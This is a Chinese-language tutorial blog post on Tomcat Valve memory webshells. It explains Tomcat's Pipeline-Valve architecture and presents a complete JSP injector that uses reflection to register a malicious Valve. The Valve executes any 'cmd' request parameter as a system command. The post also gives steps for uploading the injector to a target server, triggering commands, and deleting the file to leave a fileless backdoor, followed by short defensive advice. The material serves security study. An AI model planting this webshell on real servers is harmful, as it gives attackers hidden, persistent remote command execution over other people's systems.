---
title: "Java 内存马（五）：Tomcat Valve 内存马"
date: "2025-03-24 21:31:08"
updated: "2026-05-30 19:26:21"
categories: ["文章", "代码审计"]
tags: ["内存马", "Tomcat"]
thumbnail: "/wp-content/uploads/2025/img-ec6e1a27a4b6.png"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "894"
---
<h1 class="md-end-block md-heading md-focus"><span class="md-plain md-expand">Java 内存马（五）：Tomcat Valve 内存马</span></h1>
<h2 class="md-end-block md-heading"><span class="md-plain">1. 基本概念</span></h2>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Tomcat Valve 内存马</span></strong></span><span class="md-plain"> 是利用 Tomcat 中间件私有 Pipeline-Valve（管道 - 阀门）架构，在运行时动态注入恶意 Valve 组件的内存马。其核心是借助 Valve 对请求的拦截优先级优势，实现对 Tomcat 容器内所有请求的前置控制，具备隐蔽性强、触发范围广的特点。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">核心特性</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">中间件私有机制</span></strong></span><span class="md-plain">：依赖 Tomcat 专属的 Pipeline-Valve 架构实现，不依赖通用 Servlet API，与 Servlet/Filter/Listener 等组件完全独立。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">请求拦截优先级最高</span></strong></span><span class="md-plain">：在 Tomcat 请求处理链路中，Valve 的执行顺序早于 Filter、Servlet 及 Spring 框架的 Controller/Interceptor，可优先拦截所有请求。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">全局生效</span></strong></span><span class="md-plain">：注入到某一层容器（如 Context、Host）的 Valve，会对该容器管辖范围内的所有请求生效，无需绑定特定 URL。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">无文件落地</span></strong></span><span class="md-plain">：恶意 Valve 全程在 JVM 内存中定义、注册，不依赖磁盘上的 </span><span class="md-pair-s" spellcheck="false"><code>.class</code></span><span class="md-plain"> 文件或配置文件，常规文件查杀无法检测。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">常见利用场景</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者通过代码执行漏洞（如 Log4j2 漏洞、Struts2 漏洞）向 Tomcat 服务器注入恶意代码，动态注册 Valve。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注入后通过任意请求携带参数（如 </span><span class="md-pair-s" spellcheck="false"><code>cmd</code></span><span class="md-plain">）触发命令执行，无需记忆特定后门路径。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">即使删除初始触发文件（如恶意 JSP），注入的 Valve 仍会随 Tomcat 容器运行驻留内存，作为长期控制后门。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">2. Tomcat Valve 装载流程（开发者视角）</span></h2>
<p class="md-end-block md-p"><span class="md-plain">正常情况下，Tomcat 中 Valve 的配置需通过服务器配置文件（如 </span><span class="md-pair-s" spellcheck="false"><code>server.xml</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>context.xml</code></span><span class="md-plain">）或应用内配置实现，流程如下：</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">2.1 定义自定义 Valve 类</span></h3>
<p class="md-end-block md-p"><span class="md-plain">自定义 Valve 需继承 Tomcat 提供的 </span><span class="md-pair-s" spellcheck="false"><code>ValveBase</code></span><span class="md-plain"> 抽象类，重写 </span><span class="md-pair-s" spellcheck="false"><code>invoke</code></span><span class="md-plain"> 方法实现请求处理逻辑（如日志记录、权限校验）：</span></p>



```java
package com.example.tomcat.valve;
​
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;
import javax.servlet.ServletException;
import java.io.IOException;
​
// 自定义 Valve，实现请求日志记录功能
public class LogValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        // 前置处理：记录请求 URL 和客户端 IP
        String clientIp = request.getRemoteAddr();
        String requestUrl = request.getRequestURI();
        System.out.println("[LogValve] Client IP: " + clientIp + ", Request URL: " + requestUrl);
        
        // 调用下一个 Valve（保证请求链路不中断）
        if (getNext() != null) {
            getNext().invoke(request, response);
        }
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.2 配置 Valve 到 Tomcat 容器</span></h3>
<p class="md-end-block md-p"><span class="md-plain">通过 </span><span class="md-pair-s" spellcheck="false"><code>context.xml</code></span><span class="md-plain">（应用级配置）将自定义 Valve 注册到 Context 容器，使其对当前应用的所有请求生效：</span></p>



```xml
<!-- 应用内 META-INF/context.xml -->
<Context>
    <!-- 注册自定义 LogValve，优先级高于默认 Valve -->
    <Valve className="com.example.tomcat.valve.LogValve" />
</Context>
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.3 Tomcat 加载流程</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Tomcat 启动时，解析 </span><span class="md-pair-s" spellcheck="false"><code>context.xml</code></span><span class="md-plain"> 配置文件，识别 </span><span class="md-pair-s" spellcheck="false"><code>&lt;Valve&gt;</code></span><span class="md-plain"> 节点。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">根据 </span><span class="md-pair-s" spellcheck="false"><code>className</code></span><span class="md-plain"> 加载自定义 Valve 类，创建 Valve 实例。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">将 Valve 实例添加到当前应用对应的 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain"> 容器的 Pipeline 中。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">客户端请求到达时，请求先经过 Pipeline 中的所有自定义 Valve，再传递到后续的 Filter、Servlet 组件。</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">3. Tomcat Valve 加载流程（容器内部机制）</span></h2>
<p class="md-end-block md-p md-focus"><span class="md-plain">要理解 Valve 内存马的实现，需先掌握 Tomcat 核心的 </span><span class="md-pair-s "><strong><span class="md-plain">容器层级</span></strong></span><span class="md-plain"> 与 </span><span class="md-pair-s "><strong><span class="md-plain">Pipeline-Valve 架构</span></strong></span><span class="md-plain">：</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.1 Tomcat 四大核心容器</span></h3>
<img class="alignnone size-large wp-image-895" src="/wp-content/uploads/2025/img-ec6e1a27a4b6.png" alt="" width="1024" height="766" />
<p class="md-end-block md-p"></p>
<p class="md-end-block md-p"><span class="md-plain">Tomcat 采用分层容器结构管理请求，从顶层到下层依次为：</span></p>

<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">容器类型</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
<th><span class="td-span"><span class="md-plain">示例实现类</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s "><strong><span class="md-plain">Engine</span></strong></span></span></td>
<td><span class="td-span"><span class="md-plain">顶层容器，管理所有虚拟主机（Host），根据请求域名匹配 Host</span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>org.apache.catalina.core.StandardEngine</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s "><strong><span class="md-plain">Host</span></strong></span></span></td>
<td><span class="td-span"><span class="md-plain">代表一个虚拟主机，管理多个应用（Context），根据请求路径匹配 Context</span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>org.apache.catalina.core.StandardHost</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s "><strong><span class="md-plain">Context</span></strong></span></span></td>
<td><span class="td-span"><span class="md-plain">对应一个 Web 应用，管理所有 Servlet、Filter 等资源，隔离应用间类加载器</span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>org.apache.catalina.core.StandardContext</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s "><strong><span class="md-plain">Wrapper</span></strong></span></span></td>
<td><span class="td-span"><span class="md-plain">管理单个 Servlet 的生命周期，负责调用 Servlet 的 </span><span class="md-pair-s" spellcheck="false"><code>service</code></span><span class="md-plain"> 方法</span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>org.apache.catalina.core.StandardWrapper</code></span></span></td>
</tr>
</tbody>
</table>
</figure>
<p class="md-end-block md-p"><span class="md-plain">请求传递顺序：</span><span class="md-pair-s" spellcheck="false"><code>Engine → Host → Context → Wrapper</code></span><span class="md-plain">，最终到达 Servlet。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.2 Pipeline-Valve 架构原理</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Pipeline（管道）</span></strong></span><span class="md-plain">：每个容器（Engine/Host/Context/Wrapper）内部都有一个专属 Pipeline，是请求处理的 “通道”。</span> <span class="md-plain">每个 Pipeline 包含一个 </span><span class="md-pair-s "><strong><span class="md-plain">Basic Valve（基础阀门）</span></strong></span><span class="md-plain">，位于 Pipeline 执行顺序的最后，负责将请求传递到下一层容器的 Pipeline（如 Context 的 Basic Valve 会将请求传递给 Wrapper 的 Pipeline）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Valve（阀门）</span></strong></span><span class="md-plain">：可插拔的请求处理单元，每个 Valve 负责一项独立功能（如日志、权限校验）。</span> <span class="md-plain">自定义 Valve 通过 </span><span class="md-pair-s" spellcheck="false"><code>addValve()</code></span><span class="md-plain"> 方法添加到 Pipeline 中，执行顺序早于 Basic Valve，且多个自定义 Valve 按添加顺序依次执行。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.3 核心接口与类</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-pair-s" spellcheck="false"><code>Pipeline</code></span><span class="md-plain"> 接口</span></strong></span><span class="md-plain">：定义管道的核心操作，关键方法包括：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>addValve(Valve valve)</code></span><span class="md-plain">：向管道添加自定义 Valve。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>getValves()</code></span><span class="md-plain">：获取管道中所有 Valve 实例。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>getBasic()</code></span><span class="md-plain">：获取管道的 Basic Valve。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-pair-s" spellcheck="false"><code>Valve</code></span><span class="md-plain"> 接口</span></strong></span><span class="md-plain">：定义阀门的请求处理逻辑，核心方法 </span><span class="md-pair-s" spellcheck="false"><code>invoke(Request request, Response response)</code></span><span class="md-plain"> 用于处理请求并传递到下一个 Valve。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-pair-s" spellcheck="false"><code>ValveBase</code></span><span class="md-plain"> 抽象类</span></strong></span><span class="md-plain">：实现 </span><span class="md-pair-s" spellcheck="false"><code>Valve</code></span><span class="md-plain"> 接口的基础类，自定义 Valve 需继承此类，无需手动处理 Valve 链路传递（通过 </span><span class="md-pair-s" spellcheck="false"><code>getNext()</code></span><span class="md-plain"> 和 </span><span class="md-pair-s" spellcheck="false"><code>setNext()</code></span><span class="md-plain"> 管理下一个 Valve）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.4 正常加载流程拆解</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">容器初始化</span></strong></span><span class="md-plain">：Tomcat 启动时，每个容器（如 StandardContext）会初始化自身的 Pipeline（默认实现为 </span><span class="md-pair-s" spellcheck="false"><code>StandardPipeline</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">解析配置</span></strong></span><span class="md-plain">：ContextConfig 组件解析 </span><span class="md-pair-s" spellcheck="false"><code>context.xml</code></span><span class="md-plain"> 或 </span><span class="md-pair-s" spellcheck="false"><code>web.xml</code></span><span class="md-plain"> 中的 Valve 配置，创建 Valve 实例。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">添加到 Pipeline</span></strong></span><span class="md-plain">：调用 </span><span class="md-pair-s" spellcheck="false"><code>Pipeline.addValve(Valve)</code></span><span class="md-plain"> 方法，将自定义 Valve 加入 Pipeline 的 Valve 列表。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">请求处理</span></strong></span><span class="md-plain">：客户端请求到达时，容器的 Pipeline 依次调用所有自定义 Valve 的 </span><span class="md-pair-s" spellcheck="false"><code>invoke</code></span><span class="md-plain"> 方法，最后调用 Basic Valve 传递请求到下一层容器。</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">4. Valve 内存马实现机制</span></h2>
<p class="md-end-block md-p"><span class="md-plain">Valve 内存马的核心是 </span><span class="md-pair-s "><strong><span class="md-plain">跳过配置文件解析步骤</span></strong></span><span class="md-plain">，通过反射获取 Tomcat 容器的 Pipeline 对象，直接动态添加恶意 Valve。实现步骤如下：</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">4.1 核心思路</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">定义恶意 Valve</span></strong></span><span class="md-plain">：继承 </span><span class="md-pair-s" spellcheck="false"><code>ValveBase</code></span><span class="md-plain">，在 </span><span class="md-pair-s" spellcheck="false"><code>invoke</code></span><span class="md-plain"> 方法中实现恶意逻辑（如命令执行、请求劫持）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取目标容器</span></strong></span><span class="md-plain">：通过 </span><span class="md-pair-s" spellcheck="false"><code>ServletRequest</code></span><span class="md-plain"> 反射逐层获取 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain">（应用级容器，覆盖范围最适合内存马）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取 Pipeline</span></strong></span><span class="md-plain">：调用容器的 </span><span class="md-pair-s" spellcheck="false"><code>getPipeline()</code></span><span class="md-plain"> 方法获取 Pipeline 对象。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注册恶意 Valve</span></strong></span><span class="md-plain">：调用 </span><span class="md-pair-s" spellcheck="false"><code>Pipeline.addValve()</code></span><span class="md-plain"> 方法，将恶意 Valve 注入 Pipeline。</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">5. 示例代码（JSP Valve 内存马）</span></h2>
<p class="md-end-block md-p"><span class="md-plain">以下代码通过 JSP 脚本实现 Valve 内存马注入，注入后可通过任意请求携带 </span><span class="md-pair-s" spellcheck="false"><code>cmd</code></span><span class="md-plain"> 参数执行系统命令：</span></p>



```
<%@ page import="javax.servlet.ServletContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
// 1. 定义恶意 Valve，继承 ValveBase 并重写 invoke 方法
public class MaliciousValve extends ValveBase {
    @Override
    public void invoke(Request req, Response resp) throws IOException, ServletException {
        // 恶意逻辑：获取请求中的 cmd 参数，执行系统命令
        String cmd = req.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            // 执行系统命令
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), "GBK") // 适配 Windows 中文编码
            );
            
            // 将命令执行结果写入响应
            resp.setContentType("text/plain;charset=GBK");
            String line;
            while ((line = br.readLine()) != null) {
                resp.getWriter().println(line);
            }
            br.close();
            process.destroy();
            return; // 命令执行后可选择终止请求传递，避免后续组件干扰
        }
        
        // 若无恶意参数，继续传递请求到下一个 Valve
        if (getNext() != null) {
            getNext().invoke(req, resp);
        }
    }
}
%>

<%
// 2. 反射获取 StandardContext 容器（核心步骤）
try {
    // 2.1 从 request 获取 ServletContext（应用上下文）
    ServletContext servletContext = request.getServletContext();
    
    // 2.2 反射获取 ServletContext 内部的 ApplicationContext（Tomcat 封装的上下文）
    Field appCtxField = servletContext.getClass().getDeclaredField("context");
    appCtxField.setAccessible(true); // 突破访问权限限制
    ApplicationContext appCtx = (ApplicationContext) appCtxField.get(servletContext);
    
    // 2.3 反射获取 ApplicationContext 内部的 StandardContext（最终目标容器）
    Field stdCtxField = appCtx.getClass().getDeclaredField("context");
    stdCtxField.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdCtxField.get(appCtx);
    
    // 3. 创建恶意 Valve 并添加到 StandardContext 的 Pipeline 中
    MaliciousValve maliciousValve = new MaliciousValve();
    standardContext.getPipeline().addValve(maliciousValve);
    
    out.println("Tomcat Valve 内存马注入成功！");
} catch (Exception e) {
    out.println("注入失败：" + e.getMessage());
    e.printStackTrace();
}
%>
```


<h2 class="md-end-block md-heading"><span class="md-plain">6. 触发步骤</span></h2>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注入内存马</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">将上述 JSP 脚本（命名为 </span><span class="md-pair-s" spellcheck="false"><code>inject_valve.jsp</code></span><span class="md-plain">）上传到目标 Tomcat 服务器的 Web 应用根目录（如 </span><span class="md-pair-s" spellcheck="false"><code>webapps/ROOT/</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过浏览器或工具访问该 JSP：</span><span class="md-pair-s" spellcheck="false"><code>http://目标IP:端口/inject_valve.jsp</code></span><span class="md-plain">，页面显示 “Tomcat Valve 内存马注入成功！” 即表示注入完成。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">触发恶意逻辑</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注入成功后，</span><span class="md-pair-s "><strong><span class="md-plain">任意请求</span></strong></span><span class="md-plain">携带 </span><span class="md-pair-s" spellcheck="false"><code>cmd</code></span><span class="md-plain"> 参数即可触发命令执行，无需访问特定路径。</span> <span class="md-plain">示例：执行 </span><span class="md-pair-s" spellcheck="false"><code>whoami</code></span><span class="md-plain"> 命令：</span><span class="md-pair-s" spellcheck="false"><code>http://目标IP:端口/任意路径?cmd=whoami</code></span><span class="md-plain">。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若目标为 Windows 系统，可执行 </span><span class="md-pair-s" spellcheck="false"><code>dir</code></span><span class="md-plain"> 命令查看目录：</span><span class="md-pair-s" spellcheck="false"><code>http://目标IP:端口/?cmd=dir</code></span><span class="md-plain">。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">持久化与清理</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注入后可删除 </span><span class="md-pair-s" spellcheck="false"><code>inject_valve.jsp</code></span><span class="md-plain">，内存中的恶意 Valve 仍会驻留，直至 Tomcat 重启。</span></p>
</li>
</ul>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">7. 总结</span></h2>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心原理</span></strong></span><span class="md-plain">：利用 Tomcat Pipeline-Valve 架构的可扩展性，通过反射获取容器 Pipeline，动态注入恶意 Valve，实现请求的前置拦截与恶意逻辑执行。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">与其他内存马对比</span></strong></span><span class="md-plain">：</span></p>

<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">内存马类型</span></span></th>
<th><span class="td-span"><span class="md-plain">触发方式</span></span></th>
<th><span class="td-span"><span class="md-plain">拦截优先级</span></span></th>
<th><span class="td-span"><span class="md-plain">生效范围</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">Servlet 内存马</span></span></td>
<td><span class="td-span"><span class="md-plain">访问特定 URL</span></span></td>
<td><span class="td-span"><span class="md-plain">低（次于 Filter、Valve）</span></span></td>
<td><span class="td-span"><span class="md-plain">仅绑定的 URL</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">Filter 内存马</span></span></td>
<td><span class="td-span"><span class="md-plain">匹配 URL 模式</span></span></td>
<td><span class="td-span"><span class="md-plain">中（次于 Valve）</span></span></td>
<td><span class="td-span"><span class="md-plain">匹配模式的请求</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">Valve 内存马</span></span></td>
<td><span class="td-span"><span class="md-plain">任意请求</span></span></td>
<td><span class="td-span"><span class="md-plain">高（高于所有组件）</span></span></td>
<td><span class="td-span"><span class="md-plain">整个容器（如 Context）的所有请求</span></span></td>
</tr>
</tbody>
</table>
</figure>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">关键 API</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>StandardContext.getPipeline()</code></span><span class="md-plain">：获取容器的 Pipeline 对象。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>Pipeline.addValve(Valve)</code></span><span class="md-plain">：向 Pipeline 添加恶意 Valve。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>ValveBase.invoke(Request, Response)</code></span><span class="md-plain">：重写该方法实现恶意逻辑。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">防御建议</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">限制 Tomcat 应用的反射权限，禁止访问 </span><span class="md-pair-s" spellcheck="false"><code>org.apache.catalina</code></span><span class="md-plain"> 包下的私有类与方法。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">监控 Pipeline 中 Valve 的异常添加，定期检查 </span><span class="md-pair-s" spellcheck="false"><code>getValves()</code></span><span class="md-plain"> 返回的实例列表。</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-plain md-expand">避免使用存在代码执行漏洞的组件，防止攻击者注入恶意 Valve。</span></p>
</li>
</ul>
</li>
</ul>
